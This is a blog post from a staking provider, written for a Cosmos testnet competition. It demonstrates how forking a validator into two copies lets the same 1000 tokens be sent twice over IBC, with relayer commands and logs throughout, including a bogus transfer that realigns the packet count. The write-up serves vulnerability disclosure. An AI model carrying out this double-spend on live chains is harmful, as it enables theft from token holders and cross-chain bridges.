---
title: "Cosmos' Game of Zones Phase 3: Double Spend via a Double Sign"
description: "For Game of Zones Phase 3 we show how malicious validators can double spend via IBC"
date: 2020-06-05
thumbnail: 'https://i.imgur.com/T4m2bqR.png'
heroImage: 'https://i.imgur.com/T4m2bqR.png'
layout: Post
category:
  - cosmos
authors:
  - vshvsh
company:
 - p2p

---
# Cosmos' Game of Zones Phase 3: Double Spend via a Double Sign

We'll show how malicious validators (or validator keys thieves) can double-spend via IBC transfers using vanilla Tendermint, cosmos-sdk and relayer software.

For an experiment we have two chains: `p2p-org-3` and `responsible-3`. On p2p-org-3 there are 1000, no more and no less, of very valuable tokens with `scarce` denom. Using our trick we can make `responsible-3` accept a total sum of `2000scarce` via a channel.

## Double spend via a double sign step by step

To double spend we: 

1. Open a channel from p2p-org-3 to responsible-3
2. Stop a single validator of p2p-org-3, replicated it in two copies (let's call them `p2p-org-3.1` and `p2p-org-3.2`, though they still have an original chain-id of `p2p-org-3`) and start again in two different exemplars.

```
p2p-org-3.2$ rly q bal p2p-org-3
100000000000ptp,1000scarce
p2p-org-3.2$ rly q bal responsible-3
100000000000root,996000rsp,10transfer/hvigvvmjhcqwerty/ptp
```

3. Send 1000 scarce from `p2p-org-3.1`to `responsible-3`.
```
p2p-org-3.1$ rly tx transfer p2p-org-3 responsible-3 1000scarce true $(rly ch addr responsible-3)
I[2020-06-04|23:36:45.775] ✔ [p2p-org-3]@{68672} - msg(0:transfer) hash(13628DFA68099121C323DB7C2369489E1AFB71C2737B3D92B1BACAF5A9CFBB01)
I[2020-06-04|23:36:56.725] ✔ [responsible-3]@{68908} - msg(0:update_client,1:ics04/opaque) hash(50F3730A339AE60A1FDB4FADF484EA8FDC870E9E46C8362BEE328D7D324FDDE8)
p2p-org-3.1$ rly q bal p2p-org-3
99999999500ptp
p2p-org-3.1$ rly q bal responsible-3
100000000000root,995500rsp,10transfer/hvigvvmjhcqwerty/ptp,1000transfer/hvigvvmjhcqwerty/scarce
```

4. Switch to `p2p-org-3.2`'s terminal - there we still have `1000scarce`

```
p2p-org-3.2$ rly q bal p2p-org-3
100000000000ptp,1000scarce
p2p-org-3.2$ rly q bal responsible-3
100000000000root,995500rsp,10transfer/hvigvvmjhcqwerty/ptp,1000transfer/hvigvvmjhcqwerty/scarce
```


5. Send a bogus transfer (`100ptp`) from `p2p-org-3.2` to `responsible-3` - it fails on `responsible-3` but we bump `p2p-org-3.2`'s packet count by one to be able to send further transfers succesfully.

```
p2p-org-3.2$ rly tx transfer p2p-org-3 responsible-3 100ptp true $(rly ch addr responsible-3)
I[2020-06-04|23:39:07.369] ✔ [p2p-org-3]@{68700} - msg(0:transfer) hash(EB8CAE3CDE96FF9073B54B5E6F70C43B83DA13A30E06D833AA107CEB94EE6279)
I[2020-06-04|23:39:14.274] ✘ [responsible-3]@{0} - msg(0:update_client,1:ics04/opaque) err(client:15:couldn't verify counterparty packet commitment: key mismatch on operation #0: expected commitments/ports/transfer/channels/hvigvvmjhcqwerty/packets/3 but got commitments/ports/transfer/channels/hvigvvmjhcqwerty/packets/2: packet commitment verification failed)
```

6. Succesfully send 1000 scarce from `p2p-org-3.2`to `responsible-3`.

```
p2p-org-3.2$ rly tx transfer p2p-org-3 responsible-3 1000scarce true $(rly ch addr responsible-3)
I[2020-06-04|23:40:02.589] ✔ [p2p-org-3]@{68711} - msg(0:transfer) hash(83DFA4FB75D22220ECD94F134D8A8AE5BC0D0075D2DA6021B8DA6C4688E28787)
I[2020-06-04|23:40:12.237] ✔ [responsible-3]@{68947} - msg(0:update_client,1:ics04/opaque) hash(DD11048F41B6D0955EAC84D311DEF5DAD9A3F446398A59293C82A62D84F6B506)
p2p-org-3.2$ rly q bal p2p-org-3
99999998900ptp
gaia@ibc3-p2p-validator-2:/home/deploy$ rly q bal responsible-3
100000000000root,995000rsp,10transfer/hvigvvmjhcqwerty/ptp,2000transfer/hvigvvmjhcqwerty/scarce
```

We think that if there's ever a real attack with stolen keys or malicious validators involved, it'll be carried out with a combination of running a fork + using modified software that can issue arbitrary IBC packets (like our own RootChain).

-----
*The best way to support our contribution is to [stake ATOM with P2P Validador](https://p2p.org/cosmos?utm_source=blog&utm_medium=economy&utm_campaign=phase3_post).*

---

[P2P Validator](https://p2p.org/?utm_source=blog&utm_medium=economy&utm_campaign=phase3_post) is a world-leading non-custodial staking provider securing more than $40 million by over 1000 delegators/nominators across 15+ top-notch networks. We've been validating in Cosmos Hub since the first day of mainnet. P2P Validator provides comprehensive due-diligence and invested its own funds in ATOM in 2017 intending to support Cosmos network in the long term.

**Web:**[ https://p2p.org](https://p2p.org/?utm_source=blog&utm_medium=economy&utm_campaign=phase3_post)

**Stake ATOM with us:** [p2p.org/cosmos](https://p2p.org/cosmos?utm_source=blog&utm_medium=economy&utm_campaign=phase3_post)

**Twitter:**[ @p2pvalidator](https://twitter.com/p2pvalidator)

**Telegram:** [https://t.me/P2Pstaking](https://t.me/P2Pstaking)
